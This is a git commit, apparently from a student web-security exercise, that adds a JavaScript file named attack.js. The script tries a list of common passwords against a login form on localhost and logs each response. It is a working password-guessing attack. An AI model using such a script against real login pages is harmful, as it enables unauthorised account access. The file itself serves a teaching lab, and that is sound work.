6679ac8b0f8157823dfb3de38b57b4393a369ca9
eemiljka <eemiljka@metropolia.fi>
2024-04-09 15:42:23 +0300

    test commit

---
+++ js/attack.js
@@ -0,0 +1,30 @@
+const url = 'http://localhost/viikko3/operations/login.php';
+
+const testData = [
+    '12345',
+    'password',
+    '123456',
+    'password123',
+    'admin',
+    'qwerty',
+    'password1234',
+    'password12345',
+];
+
+const login = async (password) => {
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'username=eemil&password=' + password,
+        });
+        const result = await response.text();
+        console.log(password, result);
+    } catch (error) {
+        console.error(error);
+    }
+};
+
+testData.forEach(data => login(data));
